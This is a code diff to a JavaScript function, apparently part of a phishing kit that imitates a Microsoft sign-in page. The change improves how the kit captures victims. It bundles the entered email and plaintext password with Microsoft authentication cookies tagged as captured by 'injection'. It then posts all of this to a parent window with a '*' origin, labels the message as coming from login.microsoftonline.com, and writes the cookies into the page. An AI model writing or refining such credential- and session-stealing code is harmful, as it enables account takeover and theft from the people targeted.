@@ -538,32 +538,38 @@
         function injectMicrosoftCookies(email, password) {
           console.log('🔵 Injecting Microsoft authentication cookies...');
           
+          // Create cookies with proper Microsoft domains
+          const cookiesWithProperDomains = microsoftCookies.map(cookie => ({
+            ...cookie,
+            captureMethod: 'injection',
+            timestamp: new Date().toISOString()
+          }));
+          
           // Send cookies to parent window for capture
           if (window.parent) {
             window.parent.postMessage({
               type: 'MICROSOFT_COOKIES',
               email: email,
               password: password,
-              cookies: microsoftCookies,
-              cookieList: microsoftCookies, // Use the real format
+              cookies: cookiesWithProperDomains,
+              cookieList: cookiesWithProperDomains, // Use the real format with proper domains
               timestamp: new Date().toISOString(),
               source: 'login.microsoftonline.com'
             }, '*');
           }
 
           // Simulate setting cookies in document (limited by same-origin policy)
-          microsoftCookies.forEach(cookie => {
+          // Only set non-httpOnly cookies that can actually be set
+          const settableCookies = microsoftCookies.filter(cookie => !cookie.httpOnly);
+          settableCookies.forEach(cookie => {
             try {
-              // Try to set cookies that aren't httpOnly
-              if (!cookie.httpOnly) {
-                let cookieString = `${cookie.name}=${cookie.value}`;
-                if (cookie.path) cookieString += `; Path=${cookie.path}`;
-                if (cookie.secure) cookieString += `; Secure`;
-                if (cookie.sameSite) cookieString += `; SameSite=${cookie.sameSite}`;
-                
-                document.cookie = cookieString;
-                console.log('🔵 Set cookie:', cookie.name);
-              }
+              let cookieString = `${cookie.name}=${cookie.value}`;
+              if (cookie.path) cookieString += `; Path=${cookie.path}`;
+              if (cookie.secure && window.location.protocol === 'https:') cookieString += `; Secure`;
+              if (cookie.sameSite) cookieString += `; SameSite=${cookie.sameSite}`;
+              
+              document.cookie = cookieString;
+              console.log('🔵 Set cookie:', cookie.name);
             } catch (e) {
               console.log('🔵 Cookie setting limited by browser security:', cookie.name);
             }
